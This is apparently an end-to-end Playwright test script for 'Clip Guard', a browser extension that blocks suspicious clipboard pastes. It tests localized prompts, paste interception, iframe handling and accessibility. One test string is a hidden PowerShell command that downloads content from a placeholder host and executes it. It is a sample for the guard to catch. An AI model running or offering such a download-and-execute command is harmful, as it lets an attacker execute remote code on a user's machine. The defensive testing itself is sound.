import { createServer } from "node:http";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const extensionPath = path.join(root, "dist", "chromium");
const pageHtml = `<!doctype html><meta charset="utf-8"><title>Clip Guard test</title>
<input id="input"><textarea id="textarea"></textarea>
<div id="editable" contenteditable="true"></div>
<button id="under-toast" style="position:fixed;right:0;bottom:0;width:150px;height:40px"
 onclick="this.dataset.clicked='yes'">under toast</button>`;
const suspicious = 'powershell -w hidden -c "iwr exemplo.invalid/a | iex"';
const benign = "ordinary documentation text";
const localized = {
  pt: {
    copy: "Clip Guard: Cópia Livre ✅",
    paste: "Clip Guard: Cola Livre ✅",
    prompt: "Colagem bloqueada pelo Clip Guard",
    keep: "Manter bloqueado",
    allow: "Colar mesmo assim"
  },
  en: {
    copy: "Clip Guard: Copy OK ✅",
    paste: "Clip Guard: Paste OK ✅",
    prompt: "Paste blocked by Clip Guard",
    keep: "Keep blocked",
    allow: "Paste anyway"
  },
  es: {
    copy: "Clip Guard: Copia libre ✅",
    paste: "Clip Guard: Pegado libre ✅",
    prompt: "Clip Guard bloqueó el pegado",
    keep: "Mantener bloqueado",
    allow: "Pegar de todos modos"
  }
};
const outcomes = [];
const server = createServer((_request, response) => {
  response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  response.end(pageHtml);
});

async function composedText(page) {
  const session = page._clipGuardProtocol || await page.context().newCDPSession(page);
  page._clipGuardProtocol = session;
  const { root: documentNode } = await session.send("DOM.getDocument", { depth: -1, pierce: true });
  const textOf = (node) => [
    node.nodeValue || "",
    ...(node.children || []).map(textOf),
    ...(node.shadowRoots || []).map(textOf),
    ...(node.contentDocument ? [textOf(node.contentDocument)] : [])
  ].join(" ");
  return textOf(documentNode);
}

async function freeStatusNode(page) {
  const session = page._clipGuardProtocol || await page.context().newCDPSession(page);
  page._clipGuardProtocol = session;
  const { root: documentNode } = await session.send("DOM.getDocument", { depth: -1, pierce: true });
  const visit = (node) => [
    node,
    ...(node.children || []).flatMap(visit),
    ...(node.shadowRoots || []).flatMap(visit)
  ];
  return visit(documentNode).find((node) => {
    const attributes = new Map(Array.from(
      { length: (node.attributes || []).length / 2 },
      (_, index) => [node.attributes[index * 2], node.attributes[index * 2 + 1]]
    ));
    return attributes.get("role") === "status" &&
      attributes.get("aria-live") === "polite";
  }) || null;
}

async function waitForText(page, text, timeout = 7000) {
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    if ((await composedText(page)).includes(text)) return;
    await page.waitForTimeout(100);
  }
  throw new Error(`Expected UI text not found: ${text}`);
}

async function clickShadowButton(page, label) {
  const session = page._clipGuardProtocol || await page.context().newCDPSession(page);
  page._clipGuardProtocol = session;
  const { root: documentNode } = await session.send("DOM.getDocument", { depth: -1, pierce: true });
  const textOf = (node) => [
    node.nodeValue || "",
    ...(node.children || []).map(textOf),
    ...(node.shadowRoots || []).map(textOf)
  ].join("");
  const visit = (node) => [
    node,
    ...(node.children || []).flatMap(visit),
    ...(node.shadowRoots || []).flatMap(visit)
  ];
  const button = visit(documentNode).find((node) =>
    node.nodeName === "BUTTON" && textOf(node).trim() === label
  );
  if (!button) throw new Error(`Button not found: ${label}`);
  const { model } = await session.send("DOM.getBoxModel", { nodeId: button.nodeId });
  const points = [0, 2, 4, 6].map((index) => [
    model.content[index],
    model.content[index + 1]
  ]);
  await page.mouse.click(
    points.reduce((sum, point) => sum + point[0], 0) / points.length,
    points.reduce((sum, point) => sum + point[1], 0) / points.length
  );
}

async function triggerPaste(page, selector, text, kind = "paste") {
  return page.evaluate(({ selector: targetSelector, text: value, kind: eventKind }) => {
    const target = document.querySelector(targetSelector);
    target.focus();
    if ("setSelectionRange" in target) target.setSelectionRange(0, target.value.length);
    const transfer = new DataTransfer();
    transfer.setData("text/plain", value);
    let event;
    if (eventKind === "beforeinput") {
      event = new InputEvent("beforeinput", {
        bubbles: true,
        cancelable: true,
        inputType: "insertFromPaste",
        data: value
      });
      Object.defineProperty(event, "dataTransfer", { value: transfer });
    } else if (eventKind === "drop") {
      event = new DragEvent("drop", {
        bubbles: true,
        cancelable: true,
        dataTransfer: transfer
      });
    } else {
      event = new ClipboardEvent("paste", {
        clipboardData: transfer,
        bubbles: true,
        cancelable: true
      });
    }
    target.dispatchEvent(event);
    return event.defaultPrevented;
  }, { selector, text, kind });
}

async function readTarget(page, selector) {
  return page.locator(selector).evaluate((element) =>
    element.isContentEditable ? element.textContent : element.value
  );
}

async function record(name, action) {
  try {
    await action();
    outcomes.push({ name, passed: true });
  } catch (error) {
    outcomes.push({ name, passed: false, error: String(error?.message || error).split("\n")[0] });
  }
}

async function testLocale({ label, browserLocale, language }) {
  const expected = localized[language];
  const context = await chromium.launchPersistentContext("", {
    channel: "msedge",
    headless: false,
    args: [
      `--lang=${browserLocale}`,
      `--disable-extensions-except=${extensionPath}`,
      `--load-extension=${extensionPath}`
    ]
  });
  try {
    const worker = context.serviceWorkers().find((serviceWorker) =>
      serviceWorker.url().startsWith("chrome-extension://")
    ) || await context.waitForEvent("serviceworker", { timeout: 10000 });
    const extensionId = new URL(worker.url()).host;
    const origin = `http://127.0.0.1:${server.address().port}`;
    await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin });
    const page = await context.newPage();
    await page.goto(origin);

    await record(`${label}: toast de cópia`, async () => {
      await page.evaluate((text) => navigator.clipboard.writeText(text), benign);
      await waitForText(page, expected.copy);
    });

    await record(`${label}: toast de colagem e inserção normal`, async () => {
      await page.locator("#input").focus();
      await page.keyboard.press("Control+V");
      await page.waitForFunction(
        (text) => document.querySelector("#input").value === text,
        benign
      );
      await waitForText(page, expected.paste);
    });

    await record(`${label}: prompt localizado bloqueia paste suspeito`, async () => {
      const prevented = await triggerPaste(page, "#input", suspicious);
      if (!prevented) throw new Error("Suspicious paste was not prevented");
      if (await readTarget(page, "#input") !== benign) {
        throw new Error("Blocked paste changed the destination");
      }
      await waitForText(page, expected.prompt);
      await clickShadowButton(page, expected.keep);
      if (await readTarget(page, "#input") !== benign) {
        throw new Error("Keep blocked inserted text");
      }
    });

    if (language === "en" && browserLocale === "en-US") {
      await record("paste suspeito em input, textarea e contenteditable bloqueia, permite e mantém bloqueado", async () => {
        for (const selector of ["#input", "#textarea", "#editable"]) {
          await page.locator(selector).evaluate((element) => {
            if (element.isContentEditable) element.textContent = "";
            else element.value = "";
          });
          const prevented = await triggerPaste(page, selector, suspicious);
          if (!prevented) throw new Error(`${selector}: paste was not prevented`);
          if (await readTarget(page, selector)) throw new Error(`${selector}: blocked content inserted`);
          await waitForText(page, expected.prompt);
          await clickShadowButton(page, expected.allow);
          await page.waitForFunction(({ query, text }) => {
            const element = document.querySelector(query);
            return (element.isContentEditable ? element.textContent : element.value) === text;
          }, { query: selector, text: suspicious });
          const inserted = await readTarget(page, selector);
          if (inserted !== suspicious) {
            const pending = await page.evaluate(() => ({
              pendingPaste: window.__clip_guard_hook_state__?.pendingPaste &&
                Object.keys(window.__clip_guard_hook_state__.pendingPaste),
              state: document.querySelector("[data-clip-guard-state]")?.getAttribute("data-clip-guard-state")
            }));
            throw new Error(`${selector}: allow did not reinsert exact text (${JSON.stringify({
              inserted,
              pending
            })})`);
          }

          await page.locator(selector).evaluate((element) => {
            if (element.isContentEditable) element.textContent = "";
            else element.value = "";
          });
          await triggerPaste(page, selector, suspicious);
          await waitForText(page, expected.prompt);
          await clickShadowButton(page, expected.keep);
          if (await readTarget(page, selector)) throw new Error(`${selector}: keep inserted text`);
        }
      });

      await record("beforeinput e drop interceptam texto suspeito", async () => {
        await page.waitForTimeout(1100);
        for (const kind of ["beforeinput", "drop"]) {
          await page.locator("#input").evaluate((element) => { element.value = ""; });
          const prevented = await triggerPaste(page, "#input", suspicious, kind);
          if (!prevented) throw new Error(`${kind} was not prevented`);
          await waitForText(page, expected.prompt);
          await clickShadowButton(page, expected.keep);
          if (await readTarget(page, "#input")) throw new Error(`${kind} inserted text`);
        }
      });

      await record("iframe aninhado produz somente um toast", async () => {
        await page.evaluate((url) => {
          const first = document.createElement("iframe");
          first.id = "frame-one";
          first.src = url;
          document.body.append(first);
        }, origin);
        await page.waitForFunction(() =>
          document.querySelector("#frame-one")?.contentDocument?.readyState === "complete"
        );
        await page.evaluate(() => {
          const firstDocument = document.querySelector("#frame-one").contentDocument;
          const second = firstDocument.createElement("iframe");
          second.id = "frame-two";
          second.srcdoc = "<!doctype html><meta charset=utf-8><title>Nested frame</title><body style='min-height:100vh'>nested</body>";
          firstDocument.body.append(second);
        });
        await page.waitForTimeout(500);
        const frameInfo = await page.evaluate(() => {
          const first = document.querySelector("#frame-one");
          const second = first?.contentDocument?.querySelector("#frame-two");
          return {
            firstReady: first?.contentDocument?.readyState,
            secondHasSrcdoc: second?.hasAttribute("srcdoc"),
            secondReady: second?.contentDocument?.readyState
          };
        });
        if (!frameInfo.secondHasSrcdoc) {
          throw new Error(`Nested frame missing: ${JSON.stringify({
            frameInfo,
            urls: page.frames().map((candidate) => candidate.url())
          })}`);
        }
        const frameDeadline = Date.now() + 5000;
        const isNestedFrame = (candidate) =>
          candidate.url() === "about:srcdoc" &&
          candidate.parentFrame() !== page.mainFrame() &&
          candidate.parentFrame() !== null;
        while (Date.now() < frameDeadline && !page.frames().some(isNestedFrame)) {
          await page.waitForTimeout(100);
        }
        const frame = page.frames().find(isNestedFrame);
        if (!frame) throw new Error(`Nested frame did not load: ${JSON.stringify(
          { frameInfo, frames: page.frames().map((candidate) => ({
            url: candidate.url(),
            parent: candidate.parentFrame()?.url()
          })) }
        )}`);
        await frame.locator("body").click({ position: { x: 1, y: 1 } });
        await frame.evaluate((text) => navigator.clipboard.writeText(text), benign);
        await waitForText(page, expected.copy);
        const pageText = await composedText(page);
        if (pageText.split(expected.copy).length - 1 !== 1) {
          throw new Error("Free-copy toast was duplicated across frames");
        }
      });

      await record("modo só aviso permite paste suspeito", async () => {
        await worker.evaluate(() => chrome.storage.local.set({ protectionMode: "warn" }));
        await page.waitForFunction(() =>
          window.__clip_guard_hook_state__?.protectionMode === "warn"
        );
        await page.evaluate((text) => navigator.clipboard.writeText(text), suspicious);
        await page.locator("#input").evaluate((element) => {
          element.value = "";
          element.focus();
        });
        await page.keyboard.press("Control+V");
        await page.waitForFunction((text) => document.querySelector("#input").value === text, suspicious);
        await waitForText(page, "Clip Guard warning: suspicious paste allowed");
      });

      await record("opção desliga confirmações livres e toast não bloqueia clique", async () => {
        const options = await context.newPage();
        await options.goto(`chrome-extension://${extensionId}/options.html`);
        if (!await options.locator("#free-confirmations-enabled").isChecked()) {
          throw new Error("Free confirmations are not enabled by default");
        }
        await options.locator("#free-confirmations-enabled").uncheck();
        await options.waitForFunction(async () =>
          (await chrome.storage.local.get("showFreeConfirmations")).showFreeConfirmations === false
        );
        await page.waitForTimeout(2600);
        await page.evaluate((text) => navigator.clipboard.writeText(text), benign);
        await page.waitForTimeout(300);
        if ((await composedText(page)).includes(expected.copy)) {
          throw new Error("Free-copy toast remained enabled");
        }
        await options.close();
      });

      await record("confirmação acessível não rouba foco e não bloqueia clique", async () => {
        await worker.evaluate(() =>
          chrome.storage.local.set({ showFreeConfirmations: true })
        );
        await page.locator("#input").focus();
        await page.evaluate(async (text) => {
          await navigator.clipboard.writeText(text);
          await navigator.clipboard.writeText(text);
          await navigator.clipboard.writeText(text);
        }, benign);
        await waitForText(page, expected.copy);
        const renderedText = await composedText(page);
        if (renderedText.split(expected.copy).length - 1 !== 1) {
          throw new Error("Repeated confirmations stacked instead of replacing");
        }
        if (await page.evaluate(() => document.activeElement?.id) !== "input") {
          throw new Error("Free confirmation stole focus");
        }
        await page.locator("#under-toast").click();
        if (await page.locator("#under-toast").getAttribute("data-clicked") !== "yes") {
          throw new Error("Toast intercepted a click");
        }
        const status = await freeStatusNode(page);
        const attributes = new Map(Array.from(
          { length: (status?.attributes || []).length / 2 },
          (_, index) => [status.attributes[index * 2], status.attributes[index * 2 + 1]]
        ));
        if (attributes.get("role") !== "status" || attributes.get("aria-live") !== "polite") {
          throw new Error("Free confirmation is missing its accessible status role");
        }
      });
    }
    await page.close();
  } finally {
    await context.close();
  }
}

await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
try {
  await testLocale({ label: "pt-BR", browserLocale: "pt-BR", language: "pt" });
  await testLocale({ label: "en-US", browserLocale: "en-US", language: "en" });
  await testLocale({ label: "es", browserLocale: "es", language: "es" });
  await testLocale({ label: "fallback fr-FR", browserLocale: "fr-FR", language: "en" });
} finally {
  await new Promise((resolve) => server.close(resolve));
}

const passed = outcomes.filter(({ passed: result }) => result).length;
const report = [
  "# Clipboard and localization E2E (Chromium)",
  "",
  `Result: ${passed}/${outcomes.length} scenarios passed.`,
  "",
  "| Scenario | Result | Note |",
  "| --- | --- | --- |",
  ...outcomes.map(({ name, passed: result, error }) =>
    `| ${name} | ${result ? "PASS" : "FAIL"} | ${error ?? ""} |`
  ),
  ""
].join("\n");
await writeFile(path.join(root, "reports", "chromium-enhancements.md"), report);
console.log(report);
if (passed !== outcomes.length) process.exitCode = 1;
